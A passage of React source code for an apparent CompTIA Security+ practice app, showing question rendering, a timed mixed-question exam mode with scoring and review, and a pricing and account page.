                        {placed?<div className="drag-item" style={{width:"100%",background:`${t.green}10`,borderColor:`${t.green}40`,color:t.text,cursor:"pointer",touchAction:"manipulation"}} onClick={e=>{e.stopPropagation();setMapping(m=>{const n={...m};delete n[placed.id];return n;});}}>{placed.label}</div>
                          :<span style={{fontSize:11,color:tapDragItem?t.accent:t.textDim}}>{tapDragItem?"Tap to place here":"Drop or tap here"}</span>}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ORDERING */}
      {q.type==="ORDERING"&&!submitted&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:12}}>Arrange in the correct order using the arrows</div>
          <div style={{display:"flex",flexDirection:"column",gap:7}}>
            {orderItems.map((item,i)=>(
              <div key={item.id} className="order-item">
                <span style={{fontSize:14,fontWeight:700,color:t.accent,minWidth:26}}>{i+1}</span>
                <span style={{flex:1,fontSize:13,color:t.text}}>{item.label}</span>
                <div style={{display:"flex",gap:4}}>
                  <button className="btn btn-ghost" style={{fontSize:12,padding:"3px 9px"}} onClick={()=>{if(i>0){const n=[...orderItems];[n[i],n[i-1]]=[n[i-1],n[i]];setOrderItems(n);}}}> ↑ </button>
                  <button className="btn btn-ghost" style={{fontSize:12,padding:"3px 9px"}} onClick={()=>{if(i<orderItems.length-1){const n=[...orderItems];[n[i],n[i+1]]=[n[i+1],n[i]];setOrderItems(n);}}}> ↓ </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* FILL BLANK */}
      {q.type==="FILL BLANK"&&!submitted&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:12}}>Fill in each blank</div>
          <div style={{display:"flex",flexDirection:"column",gap:12}}>
            {q.blanks?.map(b=>(
              <div key={b.id} className="card" style={{padding:"14px 18px"}}>
                <div style={{fontSize:14,color:t.text,marginBottom:8,lineHeight:1.65}}>{b.sentence}</div>
                <div style={{fontSize:11,color:t.textDim,marginBottom:6}}>Hint: {b.hint}</div>
                <input className="input" placeholder="Your answer..." value={blanks[b.id]||""} onChange={e=>setBlanks(bl=>({...bl,[b.id]:e.target.value}))} style={{fontSize:13}}/>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* MCQ for most types */}
      {(q.choices||q.options)&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:700,fontSize:13,color:t.text,marginBottom:10}}><GlossaryText text={q.question||"Select the best answer:"} t={t}/></div>
          <div style={{display:"flex",flexDirection:"column",gap:9}}>
            {(q.choices||q.options||[]).map((choice,i)=>{
              let cls="opt";
              if(submitted){cls+=" done"; if(i===q.correct)cls+=" ok"; else if(i===selected&&i!==q.correct)cls+=" bad";}
              else if(selected===i)cls+=" sel";
              return(
                <div key={i} className={cls} onClick={()=>!submitted&&setSelected(i)}>
                  <div className="opt-ltr">{String.fromCharCode(65+i)}</div>
                  <span style={{fontSize:14,flex:1,lineHeight:1.55,color:t.text}}><GlossaryText text={choice} t={t}/></span>
                  {submitted&&i===q.correct&&<span style={{color:t.green,fontSize:16,flexShrink:0}}>✓</span>}
                  {submitted&&i===selected&&i!==q.correct&&<span style={{color:t.red,fontSize:16,flexShrink:0}}>✗</span>}
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Submit / feedback */}
      {!submitted?(
        <div style={{display:"flex",gap:10,justifyContent:"flex-end"}}>
          <button className="btn btn-primary" disabled={selected===null&&q.type!=="DRAG & DROP"&&q.type!=="ORDERING"&&q.type!=="FILL BLANK"} onClick={submit}>
            Submit Answer
          </button>
        </div>
      ):(
        <>
          <div className="card" style={{padding:"18px 22px",marginBottom:14,borderColor:isCorrect()?t.green:t.red}}>
            <div style={{fontWeight:700,fontSize:16,color:isCorrect()?t.green:t.red,marginBottom:10}}>
              {isCorrect()?"✓ Correct!":"✗ Incorrect"}
            </div>
            <p style={{fontSize:13,color:t.textSec,lineHeight:1.75}}>{q.explanation}</p>
            {/* Wrong answer feedback */}
            {!isCorrect()&&q.wrongFeedback&&selected!==null&&q.wrongFeedback[selected]&&(
              <div style={{marginTop:12,padding:"12px 14px",background:`${t.red}08`,borderRadius:7,border:`1px solid ${t.red}25`}}>
                <div style={{fontSize:12,fontWeight:600,color:t.red,marginBottom:4}}>Why option {String.fromCharCode(65+selected)} is wrong:</div>
                <div style={{fontSize:13,color:t.textSec,lineHeight:1.6}}>{q.wrongFeedback[selected]}</div>
              </div>
            )}
            {/* Show correct drag order / blanks */}
            {q.type==="ORDERING"&&!isCorrect()&&(
              <div style={{marginTop:12}}>
                <div style={{fontSize:12,fontWeight:600,color:t.accent,marginBottom:6}}>Correct order:</div>
                {q.correctOrder?.map((id,i)=>{
                  const item=q.items.find(x=>x.id===id);
                  return<div key={id} style={{fontSize:12,color:t.textSec,padding:"3px 0"}}><span style={{color:t.accent,marginRight:8}}>{i+1}.</span>{item?.label}</div>;
                })}
              </div>
            )}
          </div>
          <div style={{display:"flex",gap:10,justifyContent:"flex-end"}}>
            <button className="btn btn-ghost" onClick={()=>{setSubmitted(false);setSelected(null);setTermHistory([]);setMapping({});setTapDragItem(null);setOrderItems(q.items?[...q.items].sort(()=>Math.random()-.5):[]);setBlanks(q.blanks?Object.fromEntries(q.blanks.map(b=>[b.id,""])):{})}}>
              Try Again
            </button>
            <button className="btn btn-primary" onClick={()=>onDone({qid:q.id,correct:isCorrect(),type:q.type,title:q.title,ch:q.ch,domain:q.cat,pbq:true})}>
              Back to PBQ Bank
            </button>
            {nextQuestion&&(
              <button className="btn btn-primary" onClick={()=>onNext({qid:q.id,correct:isCorrect(),type:q.type,title:q.title,ch:q.ch,domain:q.cat,pbq:true})}>
                Next related question →
              </button>
            )}
          </div>
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// EXAM MODE
// ═══════════════════════════════════════════════════════════════
function ExamMode({user,onSave,onUpgrade,t}) {
  const [questionCount,setQuestionCount]=useState(20);
  const [started,setStarted]=useState(false);
  const [done,setDone]=useState(false);
  const [questions,setQuestions]=useState([]);
  const [answers,setAnswers]=useState({});
  const [qi,setQi]=useState(0);
  const [flagged,setFlagged]=useState({});
  const [timeLeft,setTimeLeft]=useState(3600);
  const [saved,setSaved]=useState(false);

  const isPro=user?.tier==="pro";
  const sizes=[10,20,30,40,50];
  const current=questions[qi];
  const answer=answers[qi]||{};
  const examDuration=questionCount*72;

  const shuffle=arr=>[...arr].sort(()=>Math.random()-.5);
  const formatTime=s=>{
    const h=Math.floor(s/3600);
    const m=Math.floor((s%3600)/60);
    const sec=s%60;
    if(h>0) return `${h}:${String(m).padStart(2,"0")}:${String(sec).padStart(2,"0")}`;
    return `${String(m).padStart(2,"0")}:${String(sec).padStart(2,"0")}`;
  };
  const initAnswer=item=>{
    if(item.kind==="mcq") return {selected:null};
    const q=item.q;
    return {
      selected:null,
      mapping:{},
      orderItems:q.type==="ORDERING"&&q.items?shuffle(q.items):[],
      blanks:q.blanks?Object.fromEntries(q.blanks.map(b=>[b.id,""])):{},
      tapDragItem:null,
      termInput:"",
    };
  };
  const startExam=()=>{
    const pbqCount=Math.max(1,Math.round(questionCount*.1));
    const mcqCount=questionCount-pbqCount;
    const examReadyPbqs=PBQ_BANK.filter(q=>q.type!=="TERMINAL SIM"||q.choices||q.options);
    const pickedPbq=shuffle(examReadyPbqs).slice(0,pbqCount).map(q=>({kind:"pbq",q}));
    const pickedMcq=shuffle(MCQ_BANK).slice(0,mcqCount).map(q=>({kind:"mcq",q}));
    const examQs=[...pickedPbq,...pickedMcq];
    setQuestions(examQs);
    setAnswers(Object.fromEntries(examQs.map((item,index)=>[index,initAnswer(item)])));
    setFlagged({});
    setQi(0);
    setTimeLeft(examDuration);
    setDone(false);
    setSaved(false);
    setStarted(true);
    capture("exam_mode_started", { question_count: questionCount, pbq_count: pbqCount, tier: user.tier });
  };
  const updateAnswer=patch=>setAnswers(prev=>({...prev,[qi]:{...(prev[qi]||{}),...patch}}));
  const setAnswerAt=(index,patch)=>setAnswers(prev=>({...prev,[index]:{...(prev[index]||{}),...patch}}));
  const pbqCorrect=(q,a={})=>{
    if(["TERMINAL SIM","HOTSPOT","LOG ANALYSIS","CONFIG/ACL","SCENARIO"].includes(q.type)) return a.selected===q.correct;
    if(q.type==="DRAG & DROP") return q.items?.every(item=>a.mapping?.[item.id]===q.correctMapping?.[item.id]);
    if(q.type==="ORDERING") return q.correctOrder?.every((id,i)=>a.orderItems?.[i]?.id===id);
    if(q.type==="FILL BLANK") return q.blanks?.every(b=>(a.blanks?.[b.id]||"").trim().toLowerCase()===b.answer.toLowerCase());
    return false;
  };
  const isCorrect=(item,a={})=>item.kind==="mcq" ? a.selected===item.q.correct : pbqCorrect(item.q,a);
  const isAnswered=(item,a={})=>{
    if(item.kind==="mcq") return a.selected!==null&&a.selected!==undefined;
    const q=item.q;
    if((q.choices||q.options)&&["TERMINAL SIM","HOTSPOT","LOG ANALYSIS","CONFIG/ACL","SCENARIO"].includes(q.type)) return a.selected!==null&&a.selected!==undefined;
    if(q.type==="DRAG & DROP") return Object.keys(a.mapping||{}).length>0;
    if(q.type==="FILL BLANK") return q.blanks?.some(b=>(a.blanks?.[b.id]||"").trim());
    if(q.type==="ORDERING") return Boolean(a.orderItems?.length);
    return Boolean(a.termInput);
  };
  const answeredCount=questions.filter((item,index)=>isAnswered(item,answers[index])).length;
  const correctCount=questions.filter((item,index)=>isCorrect(item,answers[index])).length;
  const score=questions.length?Math.round((correctCount/questions.length)*100):0;

  function submitExam(auto=false) {
    if(done) return;
    if(!auto&&answeredCount<questions.length){
      const ok=window.confirm("You haven't completed all the questions. Are you sure you want to submit?");
      if(!ok) return;
    }
    const rows=questions.map((item,index)=>{
      const q=item.q;
      return {
        qid:q.id,
        correct:isCorrect(item,answers[index]),
        selected:answers[index]?.selected,
        title:(item.kind==="mcq"?q.q:q.title).slice(0,80),
        ch:q.ch,
        domain:item.kind==="mcq"?(CHAPTERS.find(c=>c.id===q.ch)?.title||""):q.cat,
        topic:item.kind==="mcq"?q.topic:q.type,
        difficulty:q.difficulty,
        mcq:item.kind==="mcq",
        pbq:item.kind==="pbq",
        exam:true,
        createdAt:new Date().toISOString(),
      };
    });
    if(!saved){
      rows.forEach(row=>onSave(row));
      setSaved(true);
    }
    capture("exam_mode_completed", { question_count: questions.length, correct_count: rows.filter(r=>r.correct).length, score, auto_submitted: auto, tier: user.tier });
    setDone(true);
  }

  useEffect(()=>{
    if(!started||done)return;
    if(timeLeft<=0){submitExam(true);return;}
    const id=setInterval(()=>setTimeLeft(s=>Math.max(0,s-1)),1000);
    return()=>clearInterval(id);
  },[started,done,timeLeft]);

  const placeDragItem=(item,targetId)=>{
    if(!item)return;
    const mapping={...(answer.mapping||{})};
    Object.keys(mapping).forEach(key=>{if(mapping[key]===targetId)delete mapping[key];});
    mapping[item.id]=targetId;
    updateAnswer({mapping,tapDragItem:null});
  };

  if(!isPro) return(
    <div style={{padding:"28px 24px",maxWidth:760,margin:"0 auto"}}>
      <div className="card" style={{padding:"24px",borderColor:`${t.accent}35`,background:`${t.accent}07`}}>
        <div className="page-title-row" style={{marginBottom:10}}>
          <NavGlyph type="exam" active/>
          <h2 style={{fontSize:24,color:t.text}}>Exam Mode is Pro-only</h2>
        </div>
        <p style={{fontSize:14,color:t.textSec,lineHeight:1.7,marginBottom:16}}>
          Exam Mode mixes MCQs and PBQs, adds a timer, lets you flag questions, and gives a full answer review after submission.
        </p>
        <button className="btn btn-primary" onClick={onUpgrade}>Upgrade to Pro</button>
      </div>
    </div>
  );

  if(!started) return(
    <div style={{padding:"28px 24px",maxWidth:820,margin:"0 auto"}}>
      <div className="page-title-row" style={{marginBottom:18}}>
        <NavGlyph type="exam" active/>
        <div>
          <h2 style={{fontSize:26,color:t.text}}>Exam Mode</h2>
          <p style={{fontSize:14,color:t.textSec}}>Timed mixed practice for Pro users.</p>
        </div>
      </div>
      <div className="card" style={{padding:"20px 22px",marginBottom:16}}>
        <div style={{fontWeight:800,color:t.text,marginBottom:8}}>Exam setup</div>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7,marginBottom:16}}>
          Your exam will be 90% MCQ and 10% PBQ. PBQs appear first. The timer scales by exam length: 50 questions gives 1 hour, 10 questions gives 12 minutes.
        </p>
        <label className="label" style={{display:"block",marginBottom:8}}>Total questions</label>
        <div style={{display:"grid",gridTemplateColumns:"repeat(5,1fr)",gap:8,marginBottom:16}}>
          {sizes.map(size=>(
            <button key={size} className={`btn ${questionCount===size?"btn-primary":"btn-ghost"}`} onClick={()=>setQuestionCount(size)}>{size}</button>
          ))}
        </div>
        <div style={{fontSize:13,color:t.textSec,background:t.panel,border:`1px solid ${t.border}`,borderRadius:8,padding:"12px 14px"}}>
          {Math.max(1,Math.round(questionCount*.1))} PBQ first · {questionCount-Math.max(1,Math.round(questionCount*.1))} MCQ after · {formatTime(examDuration)} timer
        </div>
      </div>
      <div className="card" style={{padding:"16px 20px",marginBottom:16,borderColor:`${t.amber}35`,background:`${t.amber}07`}}>
        <div style={{fontWeight:800,color:t.text,fontSize:14,marginBottom:4}}>Pass/fail disclaimer</div>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
          SecurePlus uses 80% as a practice pass mark here. This is not an accurate CompTIA scoring model. In the real exam, PBQs can carry more weight and the exam has more questions.
        </p>
      </div>
      <button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"13px"}} onClick={startExam}>
        Start Exam →
      </button>
    </div>
  );

  if(done) return(
    <div style={{padding:"28px 24px",maxWidth:900,margin:"0 auto"}}>
      <div className="card" style={{padding:"22px 24px",marginBottom:16,textAlign:"center",borderColor:score>=80?`${t.green}45`:`${t.red}45`,background:score>=80?`${t.green}07`:`${t.red}07`}}>
        <div style={{fontSize:13,fontWeight:800,color:score>=80?t.green:t.red,textTransform:"uppercase",marginBottom:6}}>{score>=80?"Practice Pass":"Practice Fail"}</div>
        <h2 style={{fontSize:32,color:t.text,marginBottom:4}}>{score}%</h2>
        <div style={{fontSize:14,color:t.textSec}}>{correctCount}/{questions.length} correct</div>
      </div>
      <div className="card" style={{padding:"16px 20px",marginBottom:18,borderColor:`${t.amber}35`,background:`${t.amber}07`}}>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
          Disclaimer: the 80% pass/fail mark is only for SecurePlus practice. The real Security+ exam uses a different scoring model, PBQs can carry more weight, and the real exam has more questions.
        </p>
      </div>
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",gap:12,marginBottom:12,flexWrap:"wrap"}}>
        <h3 style={{fontSize:18,color:t.text}}>Answer Review</h3>
        <button className="btn btn-outline" onClick={()=>{setStarted(false);setDone(false);}}>New Exam</button>
      </div>
      <div style={{display:"grid",gap:12}}>
        {questions.map((item,index)=>{
          const q=item.q;
          const a=answers[index]||{};
          const ok=isCorrect(item,a);
          const title=item.kind==="mcq"?q.q:q.title;
          return(
            <div key={`${item.kind}-${q.id}`} className="card" style={{padding:"16px 18px",borderColor:ok?`${t.green}35`:`${t.red}35`}}>
              <div style={{display:"flex",gap:8,alignItems:"center",marginBottom:8,flexWrap:"wrap"}}>
                <span style={{fontWeight:900,color:ok?t.green:t.red}}>{ok?"Correct":"Incorrect"}</span>
                {item.kind==="mcq"?<ChBadge chId={q.ch} t={t}/>:<SimBadge type={q.type} t={t}/>}
                {flagged[index]&&<span className="chip" style={{background:`${t.amber}14`,color:t.amber,borderColor:`${t.amber}35`}}>Flagged</span>}
              </div>
              <div style={{fontSize:14,fontWeight:700,color:t.text,lineHeight:1.6,marginBottom:10}}>{title}</div>
              {item.kind==="mcq"&&(
                <div style={{fontSize:13,color:t.textSec,marginBottom:10}}>
                  Your answer: {a.selected!==null&&a.selected!==undefined ? `${String.fromCharCode(65+a.selected)}. ${q.opts[a.selected]}` : "Not answered"}<br/>
                  Correct answer: {String.fromCharCode(65+q.correct)}. {q.opts[q.correct]}
                </div>
              )}
              <div style={{fontSize:13,color:t.textSec,lineHeight:1.75}}>
                <strong style={{color:t.text}}>Solution: </strong>{item.kind==="mcq"?q.exp:q.explanation}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );

  const q=current?.q;
  return(
    <div style={{padding:"24px",maxWidth:960,margin:"0 auto"}}>
      <div className="card" style={{padding:"14px 16px",marginBottom:16,display:"flex",gap:12,alignItems:"center",flexWrap:"wrap",position:"sticky",top:12,zIndex:40}}>
        <div style={{fontWeight:900,color:timeLeft<300?t.red:t.text,fontSize:20}}>{formatTime(timeLeft)}</div>
        <div style={{fontSize:13,color:t.textSec}}>Question {qi+1} of {questions.length} · {answeredCount} answered</div>
        <button className={`btn ${flagged[qi]?"btn-primary":"btn-ghost"}`} style={{marginLeft:"auto",fontSize:12}} onClick={()=>setFlagged(f=>({...f,[qi]:!f[qi]}))}>
          {flagged[qi]?"Flagged":"Flag for review"}
        </button>
        <button className="btn btn-primary" style={{fontSize:12}} onClick={()=>submitExam(false)}>Submit Exam</button>
      </div>

      <div className="exam-layout">
        <div>
          <div style={{display:"flex",justifyContent:"space-between",gap:10,marginBottom:12}}>
            <button className="btn btn-ghost" disabled={qi===0} onClick={()=>setQi(i=>Math.max(0,i-1))}>← Previous</button>
            <button className="btn btn-ghost" disabled={qi===questions.length-1} onClick={()=>setQi(i=>Math.min(questions.length-1,i+1))}>Next →</button>
          </div>
          <div className="card" style={{padding:"20px 22px",marginBottom:16}}>
            <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
              {current.kind==="mcq"?<ChBadge chId={q.ch} t={t}/>:<SimBadge type={q.type} t={t}/>}
              <DiffBadge d={q.difficulty} t={t}/>
              <span className="chip" style={{background:t.panel,color:t.textSec,borderColor:t.border}}>{current.kind==="mcq"?"MCQ":"PBQ"}</span>
            </div>
            <div style={{fontSize:16,lineHeight:1.75,color:t.text,fontWeight:700}}>
              {current.kind==="mcq"?q.q:(q.question||q.title)}
            </div>
            {current.kind==="pbq"&&q.scenario&&(
              <p style={{fontSize:13,color:t.textSec,lineHeight:1.7,marginTop:12}}>{q.scenario}</p>
            )}
          </div>

          {current.kind==="pbq"&&q.logData&&<div className="log-block" style={{marginBottom:16}}>{q.logData}</div>}
          {current.kind==="pbq"&&q.diagram&&<pre className="log-block" style={{marginBottom:16}}>{q.diagram}</pre>}
          {current.kind==="pbq"&&q.currentConfig&&<div className="terminal" style={{marginBottom:16,color:"#e6c07b"}}>{q.currentConfig}</div>}

          {current.kind==="mcq"&&(
            <div style={{display:"grid",gap:9}}>
              {q.opts.map((opt,index)=>(
                <div key={index} className={`opt ${answer.selected===index?"sel":""}`} onClick={()=>updateAnswer({selected:index})}>
                  <div className="opt-ltr">{String.fromCharCode(65+index)}</div>
                  <span style={{fontSize:14,color:t.text,lineHeight:1.55}}>{opt}</span>
                </div>
              ))}
            </div>
          )}

          {current.kind==="pbq"&&(q.choices||q.options)&&(
            <div style={{display:"grid",gap:9}}>
              {(q.choices||q.options||[]).map((choice,index)=>(
                <div key={index} className={`opt ${answer.selected===index?"sel":""}`} onClick={()=>updateAnswer({selected:index})}>
                  <div className="opt-ltr">{String.fromCharCode(65+index)}</div>
                  <span style={{fontSize:14,color:t.text,lineHeight:1.55}}>{choice}</span>
                </div>
              ))}
            </div>
          )}

          {current.kind==="pbq"&&q.type==="DRAG & DROP"&&(
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:14}}>
              <div>
                <div className="label" style={{marginBottom:8}}>Items</div>
                <div style={{display:"grid",gap:7}}>
                  {q.items.filter(item=>!Object.keys(answer.mapping||{}).includes(item.id)).map(item=>(
                    <button key={item.id} className={`btn ${answer.tapDragItem?.id===item.id?"btn-primary":"btn-ghost"}`} style={{justifyContent:"flex-start",fontSize:12}} onClick={()=>updateAnswer({tapDragItem:item})}>{item.label}</button>
                  ))}
                </div>
              </div>
              <div>
                <div className="label" style={{marginBottom:8}}>Targets</div>
                <div style={{display:"grid",gap:7}}>
                  {q.targets?.map(target=>{
                    const placed=q.items.find(item=>answer.mapping?.[item.id]===target.id);
                    return(
                      <div key={target.id} className="drop-zone" onClick={()=>answer.tapDragItem&&placeDragItem(answer.tapDragItem,target.id)} style={{justifyContent:"flex-start",cursor:"pointer"}}>
                        <span style={{fontSize:12,color:t.textSec}}>{target.label}: </span>
                        <strong style={{fontSize:12,color:t.text,marginLeft:6}}>{placed?.label||"Choose item"}</strong>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {current.kind==="pbq"&&q.type==="ORDERING"&&(
            <div style={{display:"grid",gap:7}}>
              {(answer.orderItems||[]).map((item,index)=>(
                <div key={item.id} className="order-item">
                  <span style={{fontWeight:900,color:t.accent}}>{index+1}</span>
                  <span style={{flex:1}}>{item.label}</span>
                  <button className="btn btn-ghost" disabled={index===0} onClick={()=>{const next=[...(answer.orderItems||[])];[next[index],next[index-1]]=[next[index-1],next[index]];updateAnswer({orderItems:next});}}>↑</button>
                  <button className="btn btn-ghost" disabled={index===(answer.orderItems||[]).length-1} onClick={()=>{const next=[...(answer.orderItems||[])];[next[index],next[index+1]]=[next[index+1],next[index]];updateAnswer({orderItems:next});}}>↓</button>
                </div>
              ))}
            </div>
          )}

          {current.kind==="pbq"&&q.type==="FILL BLANK"&&(
            <div style={{display:"grid",gap:10}}>
              {q.blanks?.map(blank=>(
                <div key={blank.id} className="card" style={{padding:"14px 16px"}}>
                  <div style={{fontSize:13,color:t.textSec,lineHeight:1.6,marginBottom:8}}>{blank.sentence}</div>
                  <input className="input" value={answer.blanks?.[blank.id]||""} onChange={e=>updateAnswer({blanks:{...(answer.blanks||{}),[blank.id]:e.target.value}})} placeholder="Your answer"/>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="card exam-map">
          <div className="label" style={{marginBottom:10}}>Answer map</div>
          <div className="exam-map-grid">
            {questions.map((item,index)=>{
              const active=index===qi;
              const answered=isAnswered(item,answers[index]);
              return(
                <button key={index} className={`btn ${active?"btn-primary":"btn-ghost"}`} style={{minHeight:34,padding:0,fontSize:12,fontWeight:answered?500:900,borderColor:flagged[index]?t.amber:undefined,color:!active&&flagged[index]?t.amber:undefined}} onClick={()=>setQi(index)}>
                  {index+1}{answered?"":"*"}
                </button>
              );
            })}
          </div>
          <div style={{fontSize:11,color:t.textDim,lineHeight:1.6,marginTop:10}}>
            * not answered. Amber outline means flagged.
          </div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// PRICING
// ═══════════════════════════════════════════════════════════════
function Pricing({user,onUpgrade,onSyncBilling,onCancelMembership,onDeleteAccount,onNavigate,t,billingLoading=false}) {
  return(
    <div style={{padding:"32px 24px",maxWidth:700,margin:"0 auto"}}>
      <div style={{textAlign:"center",marginBottom:32}}>
        <div className="page-title-row" style={{justifyContent:"center"}}>
          <NavGlyph type="pricing" active/>
          <h2 style={{fontSize:28,fontWeight:800,color:t.text}}>Upgrade</h2>
        </div>
        <p style={{color:t.textSec,fontSize:14}}>
          <strong style={{color:t.green}}>Annual plan only:</strong> $4.99 per year · Cancel anytime
        </p>
      </div>

      <div className="pricing-grid" style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginBottom:32}}>
        {/* PRO */}
        <div className="card pricing-pro-card" style={{padding:"28px 24px",borderColor:t.accent,boxShadow:`0 4px 24px ${t.accent}18`,position:"relative"}}>
          <div style={{position:"absolute",top:-12,left:"50%",transform:"translateX(-50%)"}}>
            <span style={{background:t.accent,color:"#fff",padding:"3px 14px",borderRadius:99,fontSize:12,fontWeight:600,whiteSpace:"nowrap"}}>Most Popular</span>
          </div>
          <div className="label" style={{marginBottom:8}}>Pro</div>
          <div style={{fontSize:36,fontWeight:700,color:t.accent,marginBottom:4}}>$4.99</div>
          <div style={{fontSize:15,color:t.text,fontWeight:900,marginBottom:4,textTransform:"uppercase"}}>per year / annual billing</div>
          <div style={{fontSize:13,color:t.green,fontWeight:800,marginBottom:18}}>Works out to roughly $0.40/month</div>
          <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:24}}>
            {["Everything in Free",`${PBQ_BANK.length} PBQ simulations`,"Exam Mode with mixed MCQ/PBQ practice","8 simulation types","Full progress analytics","Chapter-by-chapter tracking","Detailed per-question feedback"].map(f=>(
              <div key={f} style={{display:"flex",gap:8,fontSize:13,color:t.textSec}}>
                <span style={{color:t.green}}>✓</span>{f}
              </div>
            ))}
          </div>
          {user.tier==="pro"?<button className="btn btn-ghost" style={{width:"100%",justifyContent:"center"}} disabled>Current Plan</button>
            :<button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"12px"}} onClick={()=>{capture("upgrade_button_clicked", { source: "upgrade_page", tier: user.tier });onUpgrade("pro");}} disabled={billingLoading}>
              {billingLoading?"Opening Stripe...":"Upgrade yearly →"}
            </button>}
          {user.tier==="free"&&(
            <button className="btn btn-outline" style={{width:"100%",justifyContent:"center",padding:"10px",marginTop:10}} onClick={onSyncBilling} disabled={billingLoading}>
              Refresh Pro status
            </button>
          )}
        </div>

        {/* FREE */}
        <div className="card pricing-free-card" style={{padding:"28px 24px"}}>
          <div className="label" style={{marginBottom:8}}>Free</div>
          <div style={{fontSize:36,fontWeight:700,color:t.text,marginBottom:4}}>$0</div>
          <div style={{fontSize:13,color:t.textDim,marginBottom:20}}>Forever</div>
          <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:24}}>
            {["All MCQ practice questions","Daily Challenge","Basic score tracking","Access to study guide"].map(f=>(
              <div key={f} style={{display:"flex",gap:8,fontSize:13,color:t.textSec}}>
                <span style={{color:t.green}}>✓</span>{f}
              </div>
            ))}
            {["PBQ simulations","Progress analytics","Detailed per-question feedback"].map(f=>(
              <div key={f} style={{display:"flex",gap:8,fontSize:13,color:t.textDim}}>
                <span>✕</span><span style={{textDecoration:"line-through"}}>{f}</span>
              </div>
            ))}
          </div>
          {user.tier==="free"&&<button className="btn btn-ghost" style={{width:"100%",justifyContent:"center"}} disabled>Current Plan</button>}
          {user.tier==="pro"&&<button className="btn btn-ghost" style={{width:"100%",justifyContent:"center"}} disabled>Included in Pro</button>}
        </div>
      </div>

      {/* Stripe note */}
      <div className="card" style={{padding:"18px 22px"}}>
        <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:8}}>Payment via Stripe</div>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
          In the live site, clicking Upgrade creates a Stripe Checkout session at <code style={{fontFamily:"'JetBrains Mono',monospace",background:t.panel,padding:"1px 6px",borderRadius:4}}>/api/stripe/checkout</code>. Payments are processed securely — we never store card details.
        </p>
      </div>

      <div className="card" style={{padding:"18px 22px",marginTop:16}}>
        <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:8}}>Account & support</div>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7,marginBottom:14}}>
          Need help? Contact <a href="mailto:secureplus.support@gmail.com" style={{color:t.accent}}>secureplus.support@gmail.com</a>.
        </p>
        <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
          <button className="btn btn-outline" style={{fontSize:13}} onClick={onCancelMembership} disabled={billingLoading}>
            Cancel membership
          </button>
          <button className="btn btn-danger" style={{fontSize:13}} onClick={onDeleteAccount}>
            Delete account
          </button>
          <button className="btn btn-ghost" style={{fontSize:13}} onClick={()=>onNavigate("privacy")}>
            Privacy policy
          </button>
          <button className="btn btn-ghost" style={{fontSize:13}} onClick={()=>onNavigate("terms")}>
            Terms & Conditions
          </button>
        </div>
      </div>

      {/* Concept page teaser */}
      <div className="card" style={{padding:"18px 22px",marginTop:16,borderStyle:"dashed",borderColor:t.accent}}>
        <div style={{display:"flex",gap:12,alignItems:"flex-start"}}>
          <span style={{fontSize:28}}>🚧</span>
          <div>
            <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:4}}>Coming Soon: Concept Deep Dives</div>
            <div style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
              A dedicated subdomain <code style={{fontFamily:"'JetBrains Mono',monospace",background:t.panel,padding:"1px 6px",borderRadius:4}}>concepts.secureplus.io</code> is planned for in-depth explanations of key topics like salting vs peppering, symmetric vs asymmetric encryption, and more. Work in progress — check back soon.
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// REFERRALS
// ═══════════════════════════════════════════════════════════════
function ReferralPage({user,t}) {
  return(
    <div style={{padding:"28px 24px",maxWidth:720,margin:"0 auto"}}>
      <div className="card" style={{padding:"28px 30px",borderColor:`${t.accent}35`,textAlign:"center"}}>
        <div style={{fontSize:40,marginBottom:12}}>🔗</div>
        <div className="label" style={{marginBottom:8}}>Coming soon</div>
        <h2 style={{fontSize:24,fontWeight:800,color:t.text,marginBottom:10}}>Referral Programme</h2>
        <p style={{fontSize:14,color:t.textSec,lineHeight:1.7}}>
          Coming soon! The SecurePlus Referral Programme is planned to release soon. It will let students invite friends and earn Pro trial time together.
        </p>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// EXAM OBJECTIVES + SUPPORT
// ═══════════════════════════════════════════════════════════════
function ObjectivesPage({t}) {
  return(
    <div style={{padding:"28px 24px",maxWidth:860,margin:"0 auto"}}>
      <div className="page-title-row">
        <NavGlyph type="objectives" active/>
        <h2 style={{fontSize:24,fontWeight:800,color:t.text}}>CompTIA Security+ (V7) Exam Objectives</h2>
      </div>
      <p style={{color:t.textSec,fontSize:14,marginBottom:20}}>
        SecurePlus is organised around the current Security+ domain structure. This page avoids locking the product name to a single exam code, since exam versions can change over time.
      </p>

      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(220px,1fr))",gap:12,marginBottom:20}}>
        {CHAPTERS.map(ch=>(
